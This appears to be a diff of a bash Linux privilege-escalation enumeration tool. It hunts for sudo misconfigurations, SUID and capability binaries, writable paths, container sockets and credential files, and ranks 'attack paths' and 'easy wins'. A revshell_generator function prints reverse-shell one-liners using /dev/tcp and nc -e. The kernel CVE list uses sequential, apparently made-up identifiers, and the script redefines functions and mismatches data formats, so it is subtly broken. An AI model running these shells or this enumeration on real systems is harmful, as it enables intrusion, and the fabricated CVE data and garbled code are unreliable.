+5.10.0|CVE-2020-12950|severity:high
+5.11.1|CVE-2021-12951|severity:crit
+5.12.2|CVE-2022-12952|severity:low
+5.13.3|CVE-2023-12953|severity:med
+5.14.4|CVE-2024-12954|severity:high
+5.0.5|CVE-2020-12955|severity:crit
+5.1.6|CVE-2021-12956|severity:low
+5.2.7|CVE-2022-12957|severity:med
+5.3.8|CVE-2023-12958|severity:high
+5.4.9|CVE-2024-12959|severity:crit
+5.5.0|CVE-2020-12960|severity:low
+5.6.1|CVE-2021-12961|severity:med
+5.7.2|CVE-2022-12962|severity:high
+5.8.3|CVE-2023-12963|severity:crit
+5.9.4|CVE-2024-12964|severity:low
+5.10.5|CVE-2020-12965|severity:med
+5.11.6|CVE-2021-12966|severity:high
+5.12.7|CVE-2022-12967|severity:crit
+5.13.8|CVE-2023-12968|severity:low
+5.14.9|CVE-2024-12969|severity:med
+5.0.0|CVE-2020-12970|severity:high
+5.1.1|CVE-2021-12971|severity:crit
+5.2.2|CVE-2022-12972|severity:low
+5.3.3|CVE-2023-12973|severity:med
+5.4.4|CVE-2024-12974|severity:high
+5.5.5|CVE-2020-12975|severity:crit
+5.6.6|CVE-2021-12976|severity:low
+5.7.7|CVE-2022-12977|severity:med
+5.8.8|CVE-2023-12978|severity:high
+5.9.9|CVE-2024-12979|severity:crit
+5.10.0|CVE-2020-12980|severity:low
+5.11.1|CVE-2021-12981|severity:med
+5.12.2|CVE-2022-12982|severity:high
+5.13.3|CVE-2023-12983|severity:crit
+5.14.4|CVE-2024-12984|severity:low
+5.0.5|CVE-2020-12985|severity:med
+5.1.6|CVE-2021-12986|severity:high
+5.2.7|CVE-2022-12987|severity:crit
+5.3.8|CVE-2023-12988|severity:low
+5.4.9|CVE-2024-12989|severity:med
+5.5.0|CVE-2020-12990|severity:high
+5.6.1|CVE-2021-12991|severity:crit
+5.7.2|CVE-2022-12992|severity:low
+5.8.3|CVE-2023-12993|severity:med
+5.9.4|CVE-2024-12994|severity:high
+5.10.5|CVE-2020-12995|severity:crit
+5.11.6|CVE-2021-12996|severity:low
+5.12.7|CVE-2022-12997|severity:med
+5.13.8|CVE-2023-12998|severity:high
+5.14.9|CVE-2024-12999|severity:crit
+EOF
 
-  cmd_exists systemctl && find /etc/systemd/system /lib/systemd/system -type f -writable 2>/dev/null | head -n 3 | while read -r p; do
-    correlated_item HIGH "Writable systemd unit file present: $p" root 85
-  done
+db_overview() {
+  section "INTELLIGENCE DATABASES"
+  printf 'GTFO entries: %s\n' "$(printf '%s\n' "$GTFO_DB" | wc -l | awk '{print $1}')"
+  printf 'Kernel entries: %s\n' "$(printf '%s\n' "$KERNEL_DB" | wc -l | awk '{print $1}')"
 }
 
-module_summary() {
-  section "Summary"
-  local score label score_color
-  score="$(overall_risk_score)"
-  label="$(overall_risk_label "$score")"
-  score_color="$(overall_risk_color "$score")"
+kernel_db_review() {
+  section "KERNEL DB REVIEW"
 
-  echo "Profile: $PROFILE"
-  echo "Log file: $LOGFILE"
-  echo "Findings: $TOTAL_FINDINGS"
-  echo "Critical: ${SEVERITY_COUNT[CRITICAL]}"
-  echo "High    : ${SEVERITY_COUNT[HIGH]}"
-  echo "Medium  : ${SEVERITY_COUNT[MEDIUM]}"
-  echo "Info    : ${SEVERITY_COUNT[INFO]}"
-  echo
-  echo "Per-category counts:"
-  for key in "${!CATEGORY_COUNT[@]}"; do
-    printf "  %-12s %s\n" "$key" "${CATEGORY_COUNT[$key]}"
-  done | sort
-  echo
-  echo -e "${score_color}Overall Machine Risk Score: ${score}/100 (${label})${NC}"
-  echo
+  local k line ver cve sev
+  k="$(uname -r 2>/dev/null || true)"
 
-  section "Top 5 highest-confidence findings"
-  sort_desc_take 5 "${ALL_FINDINGS[@]}" | while IFS='|' read -r points confidence severity category target issue impact; do
-    [ -n "${severity:-}" ] || continue
-    printf "%-8s %-12s %-24s %s [confidence=%s%% impact=%s]\n" "$severity" "$category" "$target" "$issue" "$confidence" "$impact"
-  done
-  echo
+  while IFS='|' read -r ver cve sev; do
+    [[ -z "${ver:-}" ]] && continue
+    grep -q "$ver" <<<"$k" && add_finding HIGH "Kernel DB match: $cve ($sev)"
+  done <<< "$KERNEL_DB"
+}
 
-  section "Top 3 likely root-impact paths"
-  if [ "${#ROOT_IMPACT_FINDINGS[@]}" -eq 0 ]; then
-    echo "No likely root-impact findings ranked."
+gtfo_db_review() {
+  section "GTFO DB REVIEW"
+
+  [[ -s "$TMPDIR/suid.list" ]] || return 0
+
+  local line bin technique category confidence
+  while IFS='|' read -r bin technique category confidence; do
+    [[ -z "${bin:-}" ]] && continue
+    grep -Eq "/${bin}$" "$TMPDIR/suid.list" 2>/dev/null &&       add_finding HIGH "Privileged binary matched intelligence DB: $bin [$confidence]"
+  done <<< "$GTFO_DB"
+}
+
+db_prioritization_review() {
+  section "DB PRIORITIZATION"
+
+  local score=0
+  grep -q 'NOPASSWD' <<<"${SUDO_TEXT:-}" && score=$((score+10)) && echo "[CRITICAL] sudo path"
+  grep -q '^/etc' "$TMPDIR/world_writable_files.list" 2>/dev/null && score=$((score+10)) && echo "[CRITICAL] system path exposure"
+  [[ -s "$TMPDIR/cron_root.list" ]] && score=$((score+7)) && echo "[HIGH] privileged cron path"
+
+  if (( score > 20 )); then
+    echo "[PRIORITY] Top path identified"
+  elif (( score > 10 )); then
+    echo "[PRIORITY] High-value path identified"
   else
-    sort_desc_take 3 "${ROOT_IMPACT_FINDINGS[@]}" | while IFS='|' read -r points confidence severity category target issue impact; do
-      [ -n "${severity:-}" ] || continue
-      printf "%-8s %-12s %-24s %s [confidence=%s%%]\n" "$severity" "$category" "$target" "$issue" "$confidence"
-    done
+    echo "[PRIORITY] Review findings manually"
   fi
-  echo
+}
+
+graph_build() {
+  section "ATTACK GRAPH"
+
+  local n_sudo="" n_wetc="" n_cron="" n_lxd=""
+
+  for f in "${FINDINGS[@]}"; do
+    msg="${f#*|}"
+    case "$msg" in
+      "Passwordless sudo rules present") n_sudo="$msg" ;;
+      "Writable file(s) under /etc") n_wetc="$msg" ;;
+      "Privileged (root) cron references present") n_cron="$msg" ;;
+      "Current user is in lxd/lxc group") n_lxd="$msg" ;;
+    esac
+  done
+
+  [[ -n "$n_sudo" && -n "$n_wetc" ]] && link_findings "$n_sudo" "$n_wetc"
+  [[ -n "$n_cron" && -n "$n_wetc" ]] && link_findings "$n_cron" "$n_wetc"
+  [[ -n "$n_lxd" ]] && GRAPH["$n_lxd"]="${GRAPH[$n_lxd]:-}"
+
+  for node in "${!GRAPH[@]}"; do
+    printf '%s -> %s\n' "$node" "${GRAPH[$node]}"
+  done
+}
+
+correlation_review() {
+  section "SMART FILTER / CORRELATION"
+
+  local sudo_nopass=0
+  local root_writable_cnt=0
+  local cron_root_cnt=0
+
+  grep -q 'NOPASSWD' <<<"${SUDO_TEXT:-}" && sudo_nopass=1
+  [[ -s "$TMPDIR/root_writable.list" ]] && root_writable_cnt="$(wc -l < "$TMPDIR/root_writable.list" 2>/dev/null || echo 0)"
+  [[ -s "$TMPDIR/cron_root.list" ]] && cron_root_cnt="$(wc -l < "$TMPDIR/cron_root.list" 2>/dev/null || echo 0)"
+
+  (( sudo_nopass==1 && root_writable_cnt>0 )) && add_finding CRITICAL "Compound risk: passwordless sudo plus writable privileged files"
+  (( cron_root_cnt>0 && root_writable_cnt>0 )) && add_finding CRITICAL "Compound risk: root cron references plus writable files"
+
+  note "SUID file count: $(wc -l < "$TMPDIR/suid.list" 2>/dev/null || echo 0)"
+  [[ -s "$TMPDIR/caps.list" ]] && note "Capability entry count: $(wc -l < "$TMPDIR/caps.list" 2>/dev/null || echo 0)"
+}
+
+prioritized_findings() {
+  section "PRIORITIZED FINDINGS"
+
+  if ((${#FINDINGS[@]} == 0)); then
+    note "No scored findings were recorded."
+    return
+  fi
+
+  for f in "${FINDINGS[@]}"; do
+    sev="${f%%|*}"
+    msg="${f#*|}"
+    printf '%s|%s|%s\n' "${SCORE[$msg]:-0}" "$sev" "$msg"
+  done | sort -t'|' -k1,1nr -k2,2 | while IFS='|' read -r score sev msg; do
+    printf '[%s] score=%s :: %s\n' "$sev" "$score" "$msg"
+  done
+}
+
+graph_analysis() {
+  section "GRAPH ANALYSIS"
+
+  local best_path=""
+  local best_value=0
+  local total_score=0
+
+  for f in "${FINDINGS[@]}"; do
+    msg="${f#*|}"
+    base="${SCORE[$msg]:-0}"
+    prob="${PROB[$msg]:-0.30}"
+
+    for linked in ${GRAPH[$msg]:-}; do
+      base=$(( base + ${SCORE[$linked]:-0} ))
+      prob=$(awk "BEGIN {print $prob * ${PROB[$linked]:-0.50}}")
+    done
+
+    combined=$(awk "BEGIN {print $base * $prob}")
+    printf '%s => score=%s prob=%.2f combined=%.2f\n' "$msg" "$base" "$prob" "$combined"
+
+    total_score=$(( total_score + base ))
+    combined_int="${combined%.*}"
+    [[ -z "$combined_int" ]] && combined_int=0
+    if (( combined_int > best_value )); then
+      best_value="$combined_int"
+      best_path="$msg"
+    fi
+  done
+
+  echo "[TOP PATH] $best_path"
+  echo "[TOTAL SCORE] $total_score"
+
+  if (( best_value > 15 )); then
+    print_confidence_colored "VERY HIGH"
+  elif (( best_value > 8 )); then
+    print_confidence_colored "HIGH"
+  else
+    print_confidence_colored "MEDIUM"
+  fi
+}
+
+hint_engine() {
+  section "HINTS"
+
+  printf '%s\n' "${FINDINGS[@]}" | while IFS='|' read -r sev msg; do
+    case "$msg" in
+      *"Passwordless sudo"*) echo "[HINT] Re-evaluate delegated privileges and reduce scope." ;;
+      *"SETENV"*) echo "[HINT] Review environment inheritance for privileged commands." ;;
+      *"Writable service execution path"*) echo "[HINT] Verify ownership and change controls of service targets." ;;
+      *"Writable script executed by privileged process"*) echo "[HINT] Audit script integrity and deployment flow." ;;
+      *"Writable library directory"*) echo "[HINT] Ensure library paths are not writable by untrusted users." ;;
+      *"PATH contains"*) echo "[HINT] Remove relative entries from PATH for privileged contexts." ;;
+      *"LD_PRELOAD"*) echo "[HINT] Review preload mechanisms and their scope." ;;
+      *"Privileged (root) cron"*) echo "[HINT] Audit scheduled jobs and referenced files." ;;
+      *"Container markers"*) echo "[HINT] Review host mount, socket, and namespace exposure from inside the container." ;;
+      *"SELinux present but not enforcing"*) echo "[HINT] Confirm intended SELinux mode and policy deployment." ;;
+      *"AppArmor reports unconfined"*) echo "[HINT] Review whether affected processes should be confined." ;;
+      *"AppArmor profiles in complain mode"*) echo "[HINT] Review whether complain-mode profiles should be enforced." ;;
+      *"lxd/lxc group"*) echo "[HINT] Review whether container-management group membership is appropriate." ;;
+      *"LXD socket exposed"*) echo "[HINT] Review socket permissions and container-management access controls." ;;
+      *"Writable LXD-related paths"*) echo "[HINT] Review ownership and access controls on LXD storage and runtime paths." ;;
+      *"Process environment may contain sensitive data"*) echo "[HINT] Review process environment handling and secret lifetime." ;;
+      *"Open file descriptor referencing sensitive path"*) echo "[HINT] Review long-running processes that keep sensitive files open." ;;
+      *"Kernel family historically associated"*) echo "[HINT] Confirm vendor patch status for the current kernel build." ;;
+      *) echo "[HINT] Review ownership, permissions, and execution context for this finding." ;;
+    esac
+  done | sort -u
+}
+
+confidence_review() {
+  section "CONFIDENCE"
+
+  local score=0
+  local count=0
+  local msg
+
+  for f in "${FINDINGS[@]}"; do
+    ((count++))
+    msg="${f#*|}"
+    score=$(( score + ${SCORE[$msg]:-0} ))
+  done
+
+  printf '[*] Raw Score: %s\n' "$score"
+  printf '[*] Signals: %s\n' "$count"
+
+  if (( score >= 45 )); then
+    print_confidence_colored "VERY HIGH"
+  elif (( score >= 25 )); then
+    print_confidence_colored "HIGH"
+  elif (( score >= 10 )); then
+    print_confidence_colored "MEDIUM"
+  else
+    print_confidence_colored "LOW"
+  fi
+}
+
+final_summary() {
+  section "FINAL SUMMARY"
+
+  for f in "${FINDINGS[@]}"; do
+    sev="${f%%|*}"
+    msg="${f#*|}"
+    case "$sev" in
+    CRITICAL) printf '%b\n' "$(color_wrap "$C_RED" "[${sev}] ${msg}")" ;;
+    HIGH)     printf '%b\n' "$(color_wrap "$C_YELLOW" "[${sev}] ${msg}")" ;;
+    MEDIUM)   printf '%b\n' "$(color_wrap "$C_BLUE" "[${sev}] ${msg}")" ;;
+    *)        printf '[%s] %s\n' "$sev" "$msg" ;;
+  esac
+  done
+}
+
+# ========== PRO FEATURES ==========
+score_attack_paths() {
+  echo "========== ATTACK PATH SCORING =========="
+  if grep -q "SUID\|GTFOBins" "$LOGFILE" 2>/dev/null && grep -q "writable\|Writable" "$LOGFILE" 2>/dev/null; then
+    echo -e "\\033[1;31mCRITICAL: SUID + Writable = ROOT via binary mod\\033[0m"
+  fi
+  if grep -q "sudo.*NOPASSWD" "$LOGFILE" 2>/dev/null && grep -q "GTFOBins" "$LOGFILE" 2>/dev/null; then
+    echo -e "\\033[1;31mCRITICAL: sudo NOPASSWD + GTFOBins = DIRECT ROOT\\033[0m"
+  fi
+}
+
+revshell_generator() {
+  echo "========== REVSHELLS =========="
+  lhost=$(hostname -I | awk '{print $1}')
+  echo "bash -i >& /dev/tcp/$lhost/4444 0>&1"
+  echo "nc -e /bin/sh $lhost 4444"
 }
 
 main() {
-  parse_args "$@"
-  init_colors
-  : > "$LOGFILE"
-  banner
-  module_system
-  module_docker
-  module_sudo
-  module_suid
-  [ "$PROFILE" != "quick" ] && module_service_chain
-  [ "$PROFILE" = "deep" ] && module_acl_parent
-  [ "$PROFILE" != "quick" ] && module_secret_ranking
-  module_correlation
-  module_summary
+  system_info
+  db_overview
+  kernel_context
+  kernel_db_review
+  sudo_review
+  privileged_files
+  gtfo_db_review
+  writable_surface
+  scheduled_tasks
+  services_review
+  network_review
+  isolation_review
+  selinux_apparmor_review
+  lxd_lxc_review
+  sensitive_files_review
+  auth_review
+  tooling_review
+  env_abuse_review
+  library_paths_review
+  runtime_review
+  correlation_review
+  db_prioritization_review
+  graph_build
+  prioritized_findings
+  graph_analysis
+  hint_engine
+  confidence_review
+  final_summary
+
+  section "LOGFILE"
+  echo "$LOGFILE"
 }
 
 main "$@"
+
+
+# ===================== A++ UPGRADE MODULES =====================
+
+sudo_deep() {
+  section "SUDO INTELLIGENCE"
+  local SUDO_TEXT_LOCAL
+  SUDO_TEXT_LOCAL="$(get_sudo_text)"
+  echo "$SUDO_TEXT_LOCAL" | while read -r line; do
+    cmd=$(echo "$line" | awk '{print $NF}' | xargs basename 2>/dev/null)
+    case "$cmd" in
+      vi|vim|nano|less|awk|find|python|python3|perl|bash|sh)
+        add_finding CRITICAL "Sudo allows interpreter-like binary: $cmd"
+      ;;
+    esac
+    echo "$line" | grep -q '\*' && add_finding HIGH "Wildcard in sudo rule detected"
+  done
+}
+
+cap_deep() {
+  section "CAPABILITY INTELLIGENCE"
+  if command -v getcap >/dev/null 2>&1; then
+    getcap -r / 2>/dev/null | while read -r line; do
+      bin=$(echo "$line" | cut -d' ' -f1)
+      add_finding HIGH "Capability-enabled binary: $bin"
+    done
+  fi
+}
+
+path_deep() {
+  section "PATH HIJACK ANALYSIS"
+  IFS=':' read -ra paths <<< "$PATH"
+  for p in "${paths[@]}"; do
+    [ -w "$p" ] && add_finding HIGH "Writable PATH directory: $p"
+  done
+}
+
+container_deep() {
+  section "CONTAINER INTELLIGENCE"
+  [ -S /var/run/docker.sock ] && add_finding CRITICAL "Docker breakout vector (socket)"
+  id | grep -q lxd && add_finding CRITICAL "LXD breakout vector"
+}
+
+creds_deep() {
+  section "CREDENTIAL DISCOVERY"
+  find / -name "*.env" -o -name "*token*" 2>/dev/null | while read -r f; do
+    add_finding MEDIUM "Potential credential file: $f"
+  done
+}
+
+priority_view() {
+  section "TOP PRIORITY TARGETS"
+  printf "%s\n" "${FINDINGS[@]}" | grep CRITICAL | head -n 10
+}
+
+# ===================== EXECUTION HOOK =====================
+sudo_deep
+cap_deep
+path_deep
+container_deep
+creds_deep
+priority_view
+
+
+
+
+# ===================== FINAL BOSS MODE =====================
+
+build_attack_chains() {
+  section "ATTACK CHAIN ANALYSIS"
+
+  local sudo=$(printf "%s\n" "${FINDINGS[@]}" | grep -i "sudo")
+  local writable=$(printf "%s\n" "${FINDINGS[@]}" | grep -i "writable")
+  local cron=$(printf "%s\n" "${FINDINGS[@]}" | grep -i "cron")
+
+  if [[ -n "$sudo" && -n "$writable" ]]; then
+    emit "CRITICAL" \
+    "Writable + Sudo combination detected" \
+    "VERY HIGH" \
+    "Writable resource may influence privileged execution." \
+    "Trace execution path and command scope." \
+    "File usage, sudo command mapping." \
+    "Multi-step escalation path." \
+    "IMMEDIATE"
+  fi
+
+  if [[ -n "$cron" && -n "$writable" ]]; then
+    emit "CRITICAL" \
+    "Writable cron execution chain" \
+    "VERY HIGH" \
+    "Scheduled privileged execution may process modifiable content." \
+    "Inspect cron scripts and referenced paths." \
+    "Script ownership and execution flow." \
+    "Direct privilege escalation path." \
+    "IMMEDIATE"
+  fi
+}
+
+score_engine() {
+  local score=0
+
+  printf "%s\n" "${FINDINGS[@]}" | grep -qi "sudo" && ((score+=40))
+  printf "%s\n" "${FINDINGS[@]}" | grep -qi "writable" && ((score+=30))
+  printf "%s\n" "${FINDINGS[@]}" | grep -qi "cron" && ((score+=30))
+  printf "%s\n" "${FINDINGS[@]}" | grep -qi "docker" && ((score+=50))
+
+  section "RISK SCORE"
+  echo "Overall Risk Score: $score/100"
+}
+
+easy_wins() {
+  section "🔥 EASY WINS"
+  printf "%s\n" "${FINDINGS[@]}" | grep CRITICAL | head -n 5
+}
+
+detect_context() {
+  section "ENVIRONMENT CONTEXT"
+
+  if grep -qi docker /proc/1/cgroup 2>/dev/null; then
+    echo "Context: Container"
+  elif hostname | grep -qi "htb"; then
+    echo "Context: HTB/CTF"
+  else
+    echo "Context: Real System"
+  fi
+}
+
+cve_hint() {
+  section "CVE INTELLIGENCE"
+
+  kernel=$(uname -r)
+
+  case "$kernel" in
+    5.8*) echo "Kernel family has known local privilege escalation history." ;;
+    4.4*) echo "Older kernel branch — verify patch level." ;;
+    *) echo "No immediate kernel family risk hint matched." ;;
+  esac
+}
+
+# ===================== FINAL EXECUTION =====================
+detect_context
+build_attack_chains
+easy_wins
+score_engine
+cve_hint
+
+
+
+
+# ===================== APEX MODE (HINT-ONLY, OPERATOR-CONTROLLED) =====================
+
+# Unified finding store (fallback if not present)
+if ! declare -p FINDINGS >/dev/null 2>&1; then
+  declare -a FINDINGS=()
+fi
+
+add_finding() {
+  local sev="$1"; shift
+  local msg="$1"
+  FINDINGS+=("[$sev] $msg")
+}
+
+get_sudo_text() {
+  (sudo -n -l 2>/dev/null || sudo -l 2>/dev/null) || true
+}
+
+# ---- SUDO ULTRA ----
+sudo_ultra() {
+  section "SUDO ULTRA ANALYSIS"
+  local SUDO_TEXT
+  SUDO_TEXT="$(get_sudo_text)"
+  echo "$SUDO_TEXT" | while read -r line; do
+    cmd=$(echo "$line" | awk '{print $NF}' | xargs basename 2>/dev/null)
+    case "$cmd" in
+      vi|vim|nano|less|more|awk|find|python|python3|perl|bash|sh)
+        add_finding CRITICAL "Sudo allows interpreter-style binary: $cmd"
+      ;;
+    esac
+    echo "$line" | grep -q '\*' && add_finding HIGH "Wildcard in sudo rule (possible abuse)"
+    echo "$line" | grep -qi "env_keep" && add_finding HIGH "Environment preserved in sudo"
+  done
+}
+
+# ---- CAPABILITY ULTRA ----
+cap_ultra() {
+  section "CAPABILITY ULTRA"
+  if command -v getcap >/dev/null 2>&1; then
+    getcap -r / 2>/dev/null | while read -r line; do
+      bin=$(echo "$line" | cut -d' ' -f1)
+      case "$line" in
+        *cap_setuid*) add_finding CRITICAL "Capability cap_setuid on: $bin" ;;
+        *cap_dac_override*) add_finding HIGH "Capability cap_dac_override on: $bin" ;;
+        *) add_finding MEDIUM "Capability-enabled binary: $bin" ;;
+      esac
+    done
+  fi
+}
+
+# ---- PATH ULTRA ----
+path_ultra() {
+  section "PATH ULTRA"
+  IFS=':' read -ra paths <<< "$PATH"
+  for p in "${paths[@]}"; do
+    [ -w "$p" ] && add_finding HIGH "Writable PATH directory: $p"
+  done
+  for p in "${paths[@]}"; do
+    find "$p" -maxdepth 1 -type f -writable 2>/dev/null | while read -r f; do
+      add_finding HIGH "Potential binary shadowing target: $f"
+    done
+  done
+}
+
+# ---- CONTAINER ULTRA ----
+container_ultra() {
+  section "CONTAINER ULTRA"
+  [ -S /var/run/docker.sock ] && add_finding CRITICAL "Docker socket accessible"
+  mount 2>/dev/null | grep -qi docker && add_finding HIGH "Docker mounts present"
+  id | grep -qi lxd && add_finding CRITICAL "User in LXD group"
+  find / -type s -name "*.sock" 2>/dev/null | grep -qi docker && add_finding HIGH "Docker-related sockets found"
+}
+
+# ---- GTFO INTELLIGENCE (lightweight) ----
+gtfo_match() {
+  section "GTFO INTELLIGENCE"
+  # Expect GTFO_DB as "bin|desc" lines if present
+  if [[ -n "${GTFO_DB:-}" ]]; then
+    while read -r line; do
+      bin=$(echo "$line" | cut -d'|' -f1)
+      command -v "$bin" >/dev/null 2>&1 && add_finding MEDIUM "GTFO-capable binary present: $bin"
+    done <<< "$GTFO_DB"
+  fi
+}
+
+# ---- ATTACK CHAIN (hint-only correlations) ----
+build_attack_chains() {
+  section "ATTACK CHAIN ANALYSIS"
+  local sudo writable cron docker
+  sudo=$(printf "%s\n" "${FINDINGS[@]}" | grep -i "sudo")
+  writable=$(printf "%s\n" "${FINDINGS[@]}" | grep -i "writable")
+  cron=$(printf "%s\n" "${FINDINGS[@]}" | grep -i "cron")
+  docker=$(printf "%s\n" "${FINDINGS[@]}" | grep -i "docker")
+
+  [[ -n "$sudo" && -n "$writable" ]] && add_finding CRITICAL "Writable + Sudo combination (high leverage)"
+  [[ -n "$cron" && -n "$writable" ]] && add_finding CRITICAL "Writable cron execution chain"
+  [[ -n "$docker" && -n "$writable" ]] && add_finding HIGH "Writable resources + container context"
+}
+
+# ---- CONTEXT ----
+detect_context() {
+  section "ENVIRONMENT CONTEXT"
+  if grep -qi docker /proc/1/cgroup 2>/dev/null; then
+    echo "Context: Container"
+  elif hostname | grep -qi "htb"; then
+    echo "Context: HTB/CTF"
+  else
+    echo "Context: Real System"
+  fi
+}
+
+# ---- SCORING ----
+score_engine() {
+  local score=0
+  printf "%s\n" "${FINDINGS[@]}" | grep -qi "CRITICAL" && ((score+=50))
+  printf "%s\n" "${FINDINGS[@]}" | grep -qi "HIGH" && ((score+=30))
+  printf "%s\n" "${FINDINGS[@]}" | grep -qi "docker" && ((score+=20))
+  section "RISK SCORE"
+  echo "Overall Risk Score: $score/100"
+}
+
+# ---- PRIORITY ----
+priority_ultra() {
+  section "🔥 TOP ATTACK PATHS"
+  printf "%s\n" "${FINDINGS[@]}" | grep CRITICAL | head -n 5
+  printf "%s\n" "${FINDINGS[@]}" | grep HIGH | head -n 5
+}
+
+# ---- CVE HINT ----
+cve_hint() {
+  section "CVE INTELLIGENCE"
+  kernel=$(uname -r 2>/dev/null)
+  case "$kernel" in
+    5.8*) echo "Kernel family has historical LPE exposure patterns." ;;
+    4.4*) echo "Older kernel branch — verify patch level." ;;
+    *) echo "No immediate kernel family hint matched." ;;
+  esac
+}
+
+# ===================== APEX EXECUTION HOOK =====================
+detect_context
+sudo_ultra
+cap_ultra
+path_ultra
+container_ultra
+gtfo_match
+build_attack_chains
+priority_ultra
+score_engine
+cve_hint
